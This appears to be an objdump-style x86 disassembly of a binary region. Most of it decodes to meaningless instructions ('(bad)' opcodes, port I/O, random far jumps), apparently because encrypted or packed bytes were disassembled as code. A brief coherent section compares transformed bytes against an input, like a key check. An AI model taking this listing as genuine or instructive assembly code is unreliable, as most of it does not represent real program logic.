  410afa:	pop    eax
  410afb:	mov    bh,0x2a
  410afd:	sub    DWORD PTR [eax-0x60],esp
  410b00:	xchg   DWORD PTR [eax-0xd],edi
  410b03:	jl     0x410b3d
  410b05:	mov    ebp,DWORD PTR [eax-0x74b14644]
  410b0b:	push   edi
  410b0c:	int    0x73
  410b0e:	in     eax,dx
  410b0f:	cmp    BYTE PTR [esi-0x408a5992],ah
  410b15:	cli    
  410b16:	mov    al,0xb6
  410b18:	or     edi,DWORD PTR [edx+eiz*4-0x6a]
  410b1c:	ja     0x410b31
  410b1e:	gs add dl,ch
  410b21:	sub    eax,edi
  410b23:	jg     0x410b63
  410b25:	cmp    DWORD PTR [esi+0x4b],edx
  410b28:	mov    cl,BYTE PTR [edi-0x1b]
  410b2b:	inc    ebx
  410b2c:	adc    al,dl
  410b2e:	xchg   ecx,eax
  410b2f:	loop   0x410b76
  410b31:	and    esp,DWORD PTR [esi]
  410b33:	cli    
  410b34:	out    dx,eax
  410b35:	dec    edx
  410b36:	sub    dl,BYTE PTR [esi+0x1a]
  410b39:	fistp  WORD PTR [edi+0x32e1e7bc]
  410b3f:	or     bl,BYTE PTR [esp+ecx*8+0x26]
  410b43:	adc    eax,0x309b5025
  410b48:	adc    ecx,DWORD PTR [ebp+0x188bf588]
  410b4e:	sub    al,0xe5
  410b50:	jecxz  0x410b99
  410b52:	fidivr DWORD PTR [ecx-0x2c]
  410b55:	call   0xc830:0xfdcc0659
  410b5c:	xchg   ah,ah
  410b5e:	xchg   ebp,eax
  410b5f:	xor    al,0x5
  410b61:	pop    esi
  410b63:	sti    
  410b64:	cdq    
  410b65:	(bad)  
  410b66:	push   0x50a81a85
  410b6b:	ins    BYTE PTR es:[edi],dx
  410b6c:	shl    BYTE PTR [ebx-0x40],0xc3
  410b70:	pop    ds
  410b71:	gs jg  0x410b32
  410b74:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410b75:	fmul   st,st(0)
  410b77:	mov    ds:0x84d2fd5f,al
  410b7c:	(bad)  
  410b7e:	pop    esi
  410b7f:	fsub   DWORD PTR [edi]
  410b81:	call   0x7025:0xdaa9c4cc
  410b88:	sbb    ecx,ecx
  410b8a:	pusha  
  410b8b:	add    dl,BYTE PTR [edi+0x35d561ac]
  410b91:	(bad)  
  410b92:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410b93:	daa    
  410b94:	fld    QWORD PTR [ebp+0x3c73e697]
  410b9a:	aad    0xcd
  410b9c:	xchg   esi,eax
  410b9d:	mov    esi,0xcf446558
  410ba2:	rcl    dl,1
  410ba4:	jmp    0x50aceece
  410ba9:	ficom  DWORD PTR gs:[ecx+edx*2]
  410bad:	or     al,BYTE PTR [edi-0x8d4d918]
  410bb3:	(bad)  
  410bb4:	test   eax,0xc0c3b24e
  410bb9:	sbb    al,0x7b
  410bbb:	cmp    esi,eax
  410bbd:	jl     0x410c3e
  410bbf:	neg    DWORD PTR [esi+0x4d]
  410bc2:	add    BYTE PTR [esi],al
  410bc4:	sub    eax,DWORD PTR [edi+0x28ca405a]
  410bca:	add    ecx,DWORD PTR [ecx+edx*8]
  410bcd:	xchg   ebx,eax
  410bce:	ret    
  410bcf:	fild   DWORD PTR [ecx+0x35]
  410bd2:	cmp    al,al
  410bd4:	test   BYTE PTR [ebp+0x36e38b76],cl
  410bda:	inc    edx
  410bdb:	add    bl,BYTE PTR [edx+0x7f]
  410bde:	pop    esi
  410bdf:	enter  0x180,0x23
  410be3:	jge    0x410c1c
  410be5:	icebp  
  410be6:	and    eax,0xa2518c03
  410beb:	cli    
  410bec:	in     al,dx
  410bed:	int    0x25
  410bef:	xchg   esi,eax
  410bf0:	mov    ds:0x4e6763b3,al
  410bf5:	sti    
  410bf6:	xchg   ecx,eax
  410bf7:	in     eax,0x69
  410bf9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410bfa:	ss pop di
  410bfd:	dec    esp
  410bfe:	pop    edi
  410bff:	pop    ebx
  410c00:	mov    esi,DWORD PTR [ebp-0x7b]
  410c03:	dec    esi
  410c04:	fcomp  st(5)
  410c06:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410c07:	je     0x410bd7
  410c09:	dec    ebx
  410c0a:	stc    
  410c0b:	sub    BYTE PTR [edx+0x602d8bd2],dl
  410c11:	or     cl,BYTE PTR [edx+0x3f6e3551]
  410c17:	mov    cl,BYTE PTR [ebp-0xf4ecff6]
  410c1d:	jmp    0x61d:0xf59f0de4
  410c24:	cwde   
  410c25:	jp     0x410be1
  410c27:	ins    DWORD PTR es:[edi],dx
  410c28:	inc    ebp
  410c29:	push   ebx
  410c2a:	in     al,0x76
  410c2c:	mov    ecx,0xeb5ed85
  410c31:	rcr    DWORD PTR [ecx+0x715effaa],cl
  410c37:	aas    
  410c38:	mov    edi,0xf7877aaf
  410c3d:	loopne 0x410beb
  410c3f:	pusha  
  410c40:	add    DWORD PTR [esi+0x74],ebp
  410c43:	arpl   WORD PTR [edi+0x2903a726],sp
  410c49:	xchg   esp,eax
  410c4a:	call   0x88478d68
  410c4f:	sbb    BYTE PTR [ecx-0x4c],al
  410c52:	pop    ebx
  410c53:	or     edi,ebp
  410c55:	(bad)  [edi+0x5]
  410c58:	stos   BYTE PTR es:[edi],al
  410c59:	aas    
  410c5a:	fistp  WORD PTR [esi+0x38e65a7e]
  410c60:	sbb    DWORD PTR [edi-0x8],esi
  410c63:	and    DWORD PTR [ecx],0xffffff84
  410c66:	mov    bh,0x3c
  410c68:	pop    edx
  410c69:	or     al,0xb
  410c6b:	shl    DWORD PTR [esp+ecx*4-0x1f],0x7b
  410c70:	(bad)  [eax-0x23]
  410c73:	(bad)  
  410c74:	jmp    0xe3910d40
  410c79:	adc    edx,ecx
  410c7b:	fsub   DWORD PTR [ebp-0x40]
  410c7e:	arpl   WORD PTR [eax+0x2287ed81],si
  410c84:	mov    ebx,0x2fb9cafc
  410c89:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410c8a:	cmp    al,0x7d
  410c8c:	dec    ebx
  410c8d:	jecxz  0x410cfe
  410c8f:	aam    0x43
  410c91:	mov    ds:0x880dd604,eax
  410c96:	repnz xor al,0xe1
  410c99:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410c9a:	repnz cwde 
  410c9c:	pusha  
  410c9d:	scas   eax,DWORD PTR es:[edi]
  410c9e:	mov    ecx,0xec394318
  410ca3:	daa    
  410ca4:	push   0xffffffc7
  410ca6:	mov    esi,0x75547deb
  410cab:	pusha  
  410cac:	in     eax,dx
  410cad:	and    BYTE PTR [edx],dh
  410caf:	pop    esi
  410cb0:	ret    
  410cb1:	mov    esp,ss
  410cb3:	dec    ebp
  410cb4:	das    
  410cb5:	push   cs
  410cb6:	iret   
  410cb7:	rcl    DWORD PTR [eax+ecx*8+0x61],0x59
  410cbc:	shr    bh,0xdd
  410cbf:	fisubr DWORD PTR [edi-0x2f]
  410cc2:	cdq    
  410cc3:	(bad)  
  410cc4:	sub    ecx,eax
  410cc6:	sti    
  410cc7:	fsubr  QWORD PTR [edi+0x5ece10d6]
  410ccd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410cce:	add    DWORD PTR [edi],ecx
  410cd0:	mov    ds:0xe2550708,al
  410cd5:	fs sub al,0xfb
  410cd8:	out    0x91,eax
  410cda:	in     al,0x5c
  410cdc:	inc    edi
  410cdd:	(bad)  
  410cde:	mov    esi,0x5371659b
  410ce3:	mov    bh,BYTE PTR [esi]
  410ce5:	sbb    eax,0x134cac18
  410cea:	lea    ebp,[esi-0x501643f3]
  410cf0:	jge    0x410c86
  410cf2:	jne    0x410d1f
  410cf4:	push   0x6e
  410cf6:	pop    es
  410cf7:	mov    ds:0xc0d6c948,al
  410cfc:	nop
  410cfd:	in     al,dx
  410cfe:	fsub   QWORD PTR [edi]
  410d00:	stc    
  410d01:	jp     0x410ca1
  410d03:	sbb    BYTE PTR [ecx+ebx*4],dh
  410d06:	jle    0x410c9b
  410d08:	jns    0x410cf0
  410d0a:	imul   ebp,DWORD PTR ds:0x458b0289,0xfffffff8
  410d11:	jmp    0x410fdf
  410d16:	je     0x410d40
  410d18:	(bad)  
  410d19:	push   cs
  410d1a:	push   edx
  410d1b:	lock je 0x410d8e
  410d1e:	outs   dx,BYTE PTR ds:[esi]
  410d1f:	dec    ecx
  410d20:	mov    edi,0x3bd7759c
  410d25:	mov    ds:0x7e7eb8eb,al
  410d2a:	scas   eax,DWORD PTR es:[edi]
  410d2b:	jl     0x410dab
  410d2d:	jle    0x410d8d
  410d2f:	imul   esp,DWORD PTR ds:0x2e3c056,0xffffffa3
  410d36:	push   ds
  410d37:	push   es
  410d38:	repz call 0x87e1e075
  410d3e:	cwde   
  410d3f:	push   0xffffff94
  410d41:	jmp    0xa371:0xe8ec85f
  410d48:	dec    edi
  410d49:	mov    eax,ds:0x3e6b0951
  410d4e:	cdq    
  410d4f:	ins    BYTE PTR es:[edi],dx
  410d50:	sbb    ch,ah
  410d52:	stos   DWORD PTR es:[edi],eax
  410d53:	ret    
  410d54:	jle    0x410dd4
  410d56:	mov    eax,0xf03b983d
  410d5b:	add    dh,dh
  410d5d:	fcomp  st(7)
  410d5f:	add    bh,BYTE PTR [eax+0x1b]
  410d62:	xchg   esi,eax
  410d63:	test   eax,0x8d0634dd
  410d68:	jecxz  0x410d6d
  410d6a:	fwait
  410d6b:	mov    edx,DWORD PTR [ebx]
  410d6d:	inc    ebp
  410d6e:	xor    ebx,esi
  410d70:	xor    al,0xd9
  410d72:	sub    al,0xcc
  410d74:	xchg   BYTE PTR [esi-0x5e5c6b75],ah
  410d7a:	fimul  WORD PTR [edi+0x37]
  410d7d:	jmp    0x410df6
  410d7f:	leave  
  410d80:	sbb    BYTE PTR [edx-0x46],ch
  410d83:	(bad)  
  410d84:	aad    0x3b
  410d86:	dec    esp
  410d87:	outs   dx,DWORD PTR ds:[esi]
  410d88:	pusha  
  410d89:	push   esp
  410d8a:	imul   ecx,DWORD PTR [ecx-0x28b94627],0x68
  410d91:	das    
  410d92:	loop   0x410d92
  410d94:	mov    eax,ds:0xbb19ff16
  410d99:	xor    DWORD PTR [edx+0x76],0x3e
  410d9d:	imul   edx,DWORD PTR [esp+ebp*2],0x39c18374
  410da4:	and    eax,DWORD PTR [ecx-0x25]
  410da7:	sbb    ah,BYTE PTR [esp+ebx*2]
  410daa:	jecxz  0x410d88
  410dac:	sbb    eax,0x2adea3b2
  410db1:	pop    eax
  410db2:	sub    ah,BYTE PTR [edx+0x6f19d8ca]
  410db8:	std    
  410db9:	cmp    BYTE PTR [esi+0x66],al
  410dbc:	punpcklwd mm5,DWORD PTR [edx]
  410dbf:	ins    BYTE PTR es:[edi],dx
  410dc0:	adc    ah,BYTE PTR [esi-0x7f686c72]
  410dc6:	int3   
  410dc7:	jp     0x410e2d
  410dc9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410dca:	scas   al,BYTE PTR es:[edi]
  410dcb:	ret    0xbd20
  410dce:	rol    DWORD PTR [ecx],cl
  410dd0:	mov    eax,0xae49dd35
  410dd5:	lds    ecx,FWORD PTR [ebp-0x5ef6b24c]
  410ddb:	pop    edi
  410ddc:	pop    ecx
  410ddd:	pop    edi
  410dde:	push   cs
  410ddf:	dec    esi
  410de0:	out    dx,eax
  410de1:	cmc    
  410de2:	fsubr  DWORD PTR [edx+edi*8]
  410de5:	mov    esp,0x3ff257b7
  410dea:	add    eax,0x31cdf685
  410def:	leave  
  410df0:	(bad)  
  410df1:	pushf  
  410df2:	mov    al,ds:0xa35a5064
  410df7:	jb     0x410de3
  410df9:	sbb    DWORD PTR [ecx],ecx
  410dfb:	repnz xchg edi,eax
  410dfd:	jne    0x410e24
  410dff:	data16 sbb cl,bl
  410e02:	jnp    0x410e27
  410e04:	jnp    0x410dd7
  410e06:	mov    edx,0x53803d0d
  410e0b:	push   ds
  410e0c:	jg     0x410da7
  410e0e:	inc    ecx
  410e0f:	xor    eax,0x4106eb14
  410e14:	push   ebx
  410e15:	and    al,0x3a
  410e17:	repnz mov bh,0x20
  410e1a:	mov    dh,0x4b
  410e1c:	pop    ds
  410e1d:	loop   0x410de5
  410e1f:	push   edi
  410e20:	and    cl,ch
  410e22:	mov    cl,0xa2
  410e24:	je     0x410dab
  410e26:	xchg   ecx,eax
  410e27:	pop    eax
  410e28:	and    al,0x75
  410e2a:	pop    ebx
  410e2b:	dec    edi
  410e2c:	inc    esp
  410e2d:	cmp    al,0xc
  410e2f:	and    DWORD PTR [esi-0x1d],ebx
  410e32:	sbb    BYTE PTR [ebx],dh
  410e34:	or     eax,0xda4e17f8
  410e39:	cmp    DWORD PTR [edi],esp
  410e3b:	xchg   ebx,eax
  410e3c:	xor    al,0x70
  410e3e:	les    edx,FWORD PTR [eax]
  410e40:	(bad)  [edx]
  410e42:	imul   ecx,ebx,0x16
  410e45:	pop    ds
  410e46:	loopne 0x410e1e
  410e48:	inc    ebx
  410e49:	out    0x83,al
  410e4b:	aaa    
  410e4c:	mov    al,BYTE PTR [ebx+0x7d]
  410e4f:	and    BYTE PTR [esi-0x385f534b],bh
  410e55:	pop    esi
  410e56:	dec    eax
  410e57:	ja     0x410eb0
  410e59:	das    
  410e5a:	mov    ebx,0xbe8595b6
  410e5f:	test   BYTE PTR [ecx],dh
  410e61:	inc    esi
  410e62:	mov    dl,0xce
  410e64:	aas    
  410e65:	dec    eax
  410e66:	int3   
  410e67:	lock mov ah,0xdd
  410e6a:	jmp    0x410e5a
  410e6c:	xor    al,0xa8
  410e6e:	cmp    BYTE PTR [ebx-0x5e],ah
  410e71:	mov    eax,ds:0x8c6253c4
  410e76:	pop    edi
  410e77:	xor    eax,0xee873d3b
  410e7c:	mov    edx,0x6fd9bf7a
  410e81:	aam    0xff
  410e83:	lahf   
  410e84:	adc    DWORD PTR [edi],eax
  410e86:	and    cl,0xde
  410e89:	xlat   BYTE PTR ds:[ebx]
  410e8a:	xchg   eax,ebx
  410e8c:	push   esi
  410e8d:	mov    ah,0x27
  410e8f:	arpl   WORD PTR ds:0x6aa99a66,si
  410e95:	push   0x8661b6fc
  410e9a:	ret    
  410e9b:	jns    0x410e56
  410e9d:	sar    bl,0x9b
  410ea0:	sahf   
  410ea1:	inc    ebx
  410ea2:	out    dx,al
  410ea3:	scas   eax,DWORD PTR es:[edi]
  410ea4:	xchg   edi,ebx
  410ea6:	push   edi
  410ea7:	leave  
  410ea8:	and    DWORD PTR [ecx-0x540e224c],edx
  410eae:	add    BYTE PTR [eax+edx*1],0x9e
  410eb2:	and    ecx,esi
  410eb4:	xor    al,0xff
  410eb6:	test   al,0xaa
  410eb8:	sbb    bl,al
  410eba:	gs mov al,0x49
  410ebd:	and    BYTE PTR [esi],dl
  410ebf:	inc    ebp
  410ec0:	pop    ebx
  410ec1:	outs   dx,BYTE PTR ds:[esi]
  410ec2:	sub    al,dh
  410ec4:	xchg   ebp,eax
  410ec5:	pop    ecx
  410ec6:	(bad)  
  410ec8:	push   eax
  410ec9:	iret   
  410eca:	dec    ebp
  410ecb:	call   0x3203:0x79fd4bdc
  410ed2:	in     eax,dx
  410ed3:	mov    eax,0xdc5788dd
  410ed8:	or     esp,DWORD PTR [edx-0x7e2ef21c]
  410ede:	xor    bl,bh
  410ee0:	mov    DWORD PTR [edx-0x18],ebp
  410ee3:	cmp    BYTE PTR [eax+0x11],cl
  410ee6:	dec    ebx
  410ee7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410ee8:	push   cs
  410ee9:	cdq    
  410eea:	arpl   WORD PTR [edi-0x33d6abd3],si
  410ef0:	and    eax,0x51e4fef6
  410ef5:	inc    eax
  410ef6:	jg     0x410f35
  410ef8:	(bad)  
  410efa:	bswap  esp
  410efc:	inc    ecx
  410efd:	stos   DWORD PTR es:[edi],eax
  410efe:	inc    edx
  410eff:	ins    DWORD PTR es:[edi],dx
  410f00:	jp     0x410e95
  410f02:	mov    WORD PTR [ecx-0x6d],es
  410f05:	push   ebp
  410f06:	push   cs
  410f07:	aad    0x9b
  410f09:	jne    0x410f57
  410f0b:	mov    bl,0x92
  410f0d:	mov    ds:0x13ecfa49,al
  410f12:	jmp    0x56f79464
  410f17:	fsub   st,st(1)
  410f19:	cdq    
  410f1a:	cmp    BYTE PTR [esi-0x5a139ff0],ch
  410f20:	pop    esp
  410f21:	jecxz  0x410f1f
  410f23:	and    DWORD PTR [edx-0x51],0xe7856c8a
  410f2a:	mov    ah,dl
  410f2c:	pop    ecx
  410f2d:	or     ax,0x6998
  410f31:	inc    ecx
  410f32:	xor    al,0x13
  410f34:	bnd jp 0x410efc
  410f37:	mov    fs,eax
  410f39:	retf   
  410f3a:	fild   DWORD PTR [esi+0x50]
  410f3d:	and    edi,ecx
  410f3f:	mov    edi,0xafcc16bc
  410f44:	dec    esi
  410f45:	pop    ds
  410f46:	ror    DWORD PTR [edx],1
  410f48:	mov    cl,0x94
  410f4a:	daa    
  410f4b:	pop    ds
  410f4c:	xchg   esi,eax
  410f4d:	add    DWORD PTR ds:0xe8e2cfbd,ebp
  410f53:	lock inc edx
  410f55:	cmp    BYTE PTR [edi],0x87
  410f58:	add    ebx,DWORD PTR [ebx+0xc3f216]
  410f5e:	bound  eax,QWORD PTR [eax+0x5c57ed45]
  410f64:	add    BYTE PTR [ecx],0x88
  410f67:	leave  
  410f68:	pop    edi
  410f69:	rcl    BYTE PTR [ebx-0x19b7d6c9],0x93
  410f70:	fild   DWORD PTR [edi+0x33]
  410f73:	add    DWORD PTR [ebx-0x15],0xb
  410f77:	pop    ebp
  410f78:	stos   BYTE PTR es:[edi],al
  410f79:	push   ss
  410f7a:	jne    0x410f8f
  410f7c:	mov    dh,0xe
  410f7e:	xor    eax,0x13c05e9e
  410f83:	xor    DWORD PTR [ebp+0x2],ecx
  410f86:	sar    BYTE PTR [ebx+0x68],cl
  410f89:	enter  0xf054,0x47
  410f8d:	pop    ss
  410f8e:	mov    eax,ds:0x414f565b
  410f93:	mov    ebx,0x19d421eb
  410f98:	es jmp 0x9dcdf25e
  410f9e:	stc    
  410f9f:	int    0x10
  410fa1:	stc    
  410fa2:	xchg   ebp,eax
  410fa3:	jmp    0x82ff:0xa6e625
  410faa:	mov    dl,0x4d
  410fac:	adc    esp,DWORD PTR [ebx]
  410fae:	xchg   edx,eax
  410faf:	or     BYTE PTR [ebp+0x41b8daa],ah
  410fb5:	es xchg ebp,eax
  410fb7:	ins    DWORD PTR es:[edi],dx
  410fb8:	push   ss
  410fb9:	xor    al,0xfa
  410fbb:	pop    esp
  410fbc:	xor    DWORD PTR [edi],esp
  410fbe:	fldenv [esi-0x5c]
  410fc1:	fnstcw WORD PTR [ebp+0x40]
  410fc4:	sbb    dl,BYTE PTR [ebp+0x20]
  410fc7:	xor    BYTE PTR [ebx-0x2998ef4f],0x2e
  410fce:	cmc    
  410fcf:	xchg   ebp,eax
  410fd0:	subps  xmm6,xmm7
  410fd3:	xchg   ah,bl
  410fd5:	cmp    eax,0xa13a9819
  410fda:	mov    edi,0xc28cd4b6
  410fdf:	xor    eax,ecx
  410fe1:	add    eax,esi
  410fe3:	mov    DWORD PTR [ebp+0x8],eax
  410fe6:	mov    eax,DWORD PTR [ebp+0x8]
  410fe9:	mov    al,BYTE PTR [ebp+eax*1-0x58]
  410fed:	mov    dl,BYTE PTR [ebp-0x1]
  410ff0:	cmp    al,dl
  410ff2:	je     0x411303
  410ff8:	mov    eax,DWORD PTR [ebp+0x8]
  410ffb:	mov    al,BYTE PTR [ebp+eax*1-0x58]
  410fff:	mov    edx,DWORD PTR [ebp+0xc]
  411002:	cmp    al,BYTE PTR [edx]
  411004:	jne    0x4115f7
  41100a:	mov    eax,DWORD PTR [ebp-0x8]
  41100d:	mov    edx,DWORD PTR [ebp+0xc]
  411010:	movsx  edx,BYTE PTR [edx]
  411013:	xor    eax,ecx
  411015:	add    eax,esi
  411017:	cmp    edx,eax
  411019:	jmp    0x4112e7
  41101e:	jmp    0x411054
  411020:	push   esp
  411021:	dec    ebx
  411022:	push   ecx
  411023:	imul   esi,ecx,0xffffffb4
  411026:	and    DWORD PTR [edx-0x16],esi
  411029:	loope  0x411072
  41102b:	or     DWORD PTR [ecx],ebp
  41102d:	mov    al,ds:0x7e7e4718
  411032:	scas   eax,DWORD PTR es:[edi]
  411033:	jl     0x4110b3
  411035:	jle    0x411049
  411037:	mov    ah,0x1c
  411039:	jge    0x41109a
  41103b:	push   esi
  41103c:	inc    edi
  41103d:	jmp    0x4110ba
  41103f:	test   DWORD PTR [ebx-0x4bc53c86],ebp
  411045:	repz jp 0x410fce
  411048:	jge    0x410fe3
  41104a:	cs retf 
  41104c:	in     al,dx
  41104d:	call   0x8cae854a
  411052:	and    BYTE PTR [ecx+ebp*2],dl
  411055:	inc    ebx
  411056:	cdq    
  411057:	jecxz  0x41107c
  411059:	daa    
  41105a:	jmp    0xd4a1:0x114f0822
  411061:	pop    edx
  411062:	mov    bh,0xb6
  411064:	lahf   
  411065:	cli    
  411066:	sbb    al,0x1e
  411068:	and    BYTE PTR [ebp-0x9],ah
  41106b:	mov    cl,0x3
  41106d:	(bad)  
  41106f:	icebp  
  411070:	xor    al,0xc
  411072:	in     eax,0xfb
  411074:	dec    eax
  411075:	es das 
  411077:	hlt    
  411078:	push   ebx
  411079:	and    ah,ch
  41107b:	(bad)  
  41107c:	pushf  
  41107d:	test   BYTE PTR [eax-0x79],cl
  411080:	mov    esp,DWORD PTR [ecx+0x46]
  411083:	or     BYTE PTR [edx+eax*1],cl
  411086:	fs fs push 0x63659ccb
  41108d:	pop    esp
  41108e:	jne    0x41102b
  411090:	dec    edi
  411091:	or     esp,DWORD PTR gs:[ebp-0x1e6c7d91]
  411098:	dec    esp
  411099:	mov    edi,0xf15ae5bf
  41109e:	push   0xffffffc7
  4110a0:	rcl    DWORD PTR [edi],cl
  4110a2:	fadd   st,st(0)
  4110a4:	add    ah,BYTE PTR [ebx+0x45]
  4110a7:	fld    DWORD PTR [edx+0x2d]
  4110aa:	xor    ah,cl
  4110ac:	das    
  4110ad:	jnp    0x411087
  4110af:	pusha  
  4110b0:	xor    ah,BYTE PTR [ebx]
  4110b2:	add    al,0x71
  4110b4:	inc    esi
  4110b5:	xchg   edx,eax
  4110b6:	pusha  
  4110b7:	ret    
  4110b8:	jbe    0x4110e2
  4110ba:	out    0xe4,al
  4110bc:	or     eax,0xb6a16aeb
  4110c1:	sbb    dl,al
  4110c3:	inc    edi
  4110c4:	hlt    
  4110c5:	mov    al,ds:0xe6468c70
  4110ca:	out    0xb,eax
  4110cc:	les    ecx,FWORD PTR [ecx]
  4110ce:	pop    ebp
  4110cf:	inc    edi
  4110d0:	mov    al,0xf1
  4110d2:	and    dl,BYTE PTR [ebx-0x1e388807]
  4110d8:	rol    DWORD PTR [edx],0x3
  4110db:	and    BYTE PTR [ecx+0x7],ch
  4110de:	scas   al,BYTE PTR es:[edi]
  4110df:	imul   ebp,esp,0xffffffbf
  4110e2:	sbb    esi,DWORD PTR [edx-0x6b]
  4110e5:	les    eax,FWORD PTR [ebp+0x4072a5b6]
  4110eb:	fild   DWORD PTR [ebp+0x293e3dec]
  4110f1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4110f2:	in     eax,0xba
  4110f4:	jns    0x4110e3
  4110f6:	pop    esp
  4110f7:	adc    bl,dl
  4110f9:	inc    esi
  4110fa:	out    0xed,eax
  4110fc:	xchg   esp,eax
  4110fd:	push   ecx
  4110fe:	cmp    eax,0x268ab121
  411103:	out    dx,eax
  411104:	repz aas 
  411106:	or     dh,dh
  411108:	(bad)  
  411109:	call   0x430b6ab9
  41110e:	mov    bl,BYTE PTR [ebp-0x2f]
  411111:	adc    al,0xc
  411113:	xchg   BYTE PTR [ebx],ah
  411115:	cld    
  411116:	mov    ds:0x143ea348,al
  41111b:	mov    ah,0xac
  41111d:	shl    BYTE PTR [eax],cl
  41111f:	xchg   edx,eax
  411120:	pop    es
  411121:	gs xor esp,edi
  411124:	push   es
  411125:	out    dx,eax
  411126:	cld    
  411127:	leave  
  411128:	push   edi
  411129:	mov    ah,0xd8
  41112b:	inc    esi
  41112c:	sar    DWORD PTR [esp+eax*1+0x17f6329a],0x3e
  411134:	sbb    ah,al
  411136:	mov    BYTE PTR [ebp-0x7b7376fd],0x9e
  41113d:	outs   dx,DWORD PTR ds:[esi]
  41113e:	(bad)  
  41113f:	dec    eax
  411140:	xor    DWORD PTR [edi+edi*2-0x7b],esi
  411144:	jp     0x41111c
  411146:	fsubr  DWORD PTR [ebx-0x60a81ebd]
  41114c:	pop    edi
  41114d:	je     0x411109
  41114f:	movsx  esp,WORD PTR [ecx+0x23c86d2a]
  411156:	rol    DWORD PTR [ecx-0x3f],1
  411159:	out    dx,al
  41115a:	mov    ecx,0xc3097d6f
  41115f:	jp     0x411170
  411161:	lods   eax,DWORD PTR ds:[esi]
  411162:	push   edx
  411163:	jbe    0x411116
  411165:	shr    BYTE PTR [ebx-0x57],0x62
  411169:	adc    al,BYTE PTR [eax]
  41116b:	test   eax,0x58e20775
  411170:	aas    
  411171:	sti    
  411172:	pop    ss
  411173:	imul   esp,edi,0xfea9058
  411179:	push   ds
  41117a:	(bad)  
  41117b:	popa   
  41117c:	mov    al,0x1f
  41117e:	sub    cl,BYTE PTR [ebx]
  411180:	(bad)  
  411181:	push   ebx
  411182:	out    0x77,al
  411184:	jle    0x411188
  411186:	daa    
  411187:	repz cdq 
  411189:	das    
  41118a:	cdq    
  41118b:	cli    
  41118c:	ins    DWORD PTR es:[edi],dx
  41118d:	adc    eax,0xba969ef6
  411192:	mov    al,ds:0x60ae158
  411197:	cwde   
  411198:	(bad)  
  411199:	(bad)  
  41119a:	enter  0x7560,0x2e
  41119e:	mov    esi,0x8185efa
  4111a3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4111a4:	int3   
  4111a5:	addr16 dec esi
  4111a7:	pop    esp
  4111a8:	rol    BYTE PTR [esi],cl
  4111aa:	dec    ebp
  4111ab:	inc    esi
  4111ac:	jmp    0x4111e7
  4111ae:	imul   esi,edx,0x6463543a
  4111b4:	mov    ecx,fs
  4111b6:	or     esp,DWORD PTR [eax-0x55c4a764]
  4111bc:	test   edi,ebx
  4111be:	jmp    0x4bc0:0xed58fef7
  4111c5:	dec    esp
  4111c6:	xor    al,0x8a
  4111c8:	dec    ebx
  4111c9:	(bad)  
  4111ca:	leave  
  4111cb:	push   eax
  4111cc:	aas    
  4111cd:	sub    esi,DWORD PTR [edi+0x50]
  4111d0:	out    dx,al
  4111d1:	test   eax,0xcb386928
  4111d6:	lea    ebp,[esi+0x13d14880]
  4111dc:	dec    edi
  4111dd:	cdq    
  4111de:	xchg   edx,eax
  4111df:	aas    
  4111e0:	adc    BYTE PTR [ecx],al
  4111e2:	ret    
  4111e3:	or     ecx,DWORD PTR [ecx-0x126f5a09]
  4111e9:	push   esp
  4111ea:	int3   
  4111eb:	sub    al,0x8d
  4111ed:	nop
  4111ee:	and    edi,DWORD PTR [edi+esi*2-0x2d]
  4111f2:	and    edx,DWORD PTR [edx+0x1f]
  4111f5:	sub    bh,BYTE PTR [ebx+0x5c67b34b]
  4111fb:	mov    es,WORD PTR [edx+0x2750db4e]
  411201:	or     al,0xbb
  411203:	lds    esp,FWORD PTR [ebx+0x39d3689d]
  411209:	in     eax,dx
  41120a:	leave  
  41120b:	scas   al,BYTE PTR es:[edi]
  41120c:	mov    bl,0x4e
  41120e:	stc    
  41120f:	adc    ah,dh
  411211:	fisub  WORD PTR [ecx]
  411213:	cld    
  411214:	pop    ss
  411215:	sbb    al,0xe7
  411217:	or     eax,0xafc4b188
  41121c:	in     al,dx
  41121d:	test   BYTE PTR [edi],0xf7
  411220:	(bad)  
  411222:	pop    ds
  411223:	popa   
  411224:	dec    ebx
  411225:	not    DWORD PTR [ebp-0x459943a0]
  41122b:	inc    ebx
  41122c:	(bad)  
  41122d:	push   0xe935d97e
  411232:	mov    dl,BYTE PTR [ecx]
  411234:	cld    
  411235:	cli    
  411236:	xlat   BYTE PTR ds:[ebx]
  411237:	sub    ecx,0xdef97367
  41123d:	push   esp
  41123e:	std    
  41123f:	(bad)  
  411240:	lea    eax,[ebp+edi*2-0x5813bfa]
  411247:	mov    dl,0xd
  411249:	push   cs
  41124a:	sub    BYTE PTR [eax],bh
  41124c:	mov    esi,0x98017769
  411251:	xchg   edx,eax
  411252:	call   0x57bbc44d
  411257:	pop    edx
  411258:	xchg   edx,eax
  411259:	mov    ebx,esi
  41125b:	retf   0xbfe1
  41125e:	sbb    esi,esp
  411260:	fldenv [eax]
  411262:	and    eax,0xec9e459a
  411267:	fisub  WORD PTR [ebp+ecx*8-0x1]
  41126b:	div    esp
  41126d:	repnz push ds
  41126f:	mov    dl,0x4a
  411271:	lods   al,BYTE PTR ds:[esi]
  411272:	jae    0x41124a
  411274:	dec    ebp
  411275:	std    
  411276:	pop    ebp
  411277:	pop    eax
  411278:	pop    ebx
  411279:	std    
  41127a:	(bad)
  41127e:	add    DWORD PTR [esi+0x6b],ecx
  411281:	or     DWORD PTR [ebx-0x3b53af26],eax
  411287:	pop    edi
  411288:	repz test al,0xa1
  41128c:	xchg   DWORD PTR [eax+0x10d47316],esi
  411292:	mov    BYTE PTR [esi-0xa],dh
  411295:	lock pop ds
  411297:	add    BYTE PTR [eax+0x5dadeed0],ah
  41129d:	pop    esp
  41129e:	and    BYTE PTR ds:0x50115fa2,al
  4112a4:	sub    BYTE PTR ds:0x31ac2422,bl
  4112aa:	ja     0x411262
  4112ac:	int    0x92
  4112ae:	(bad)  
  4112af:	mov    ah,0xa7
  4112b1:	and    al,0x30
  4112b3:	push   es
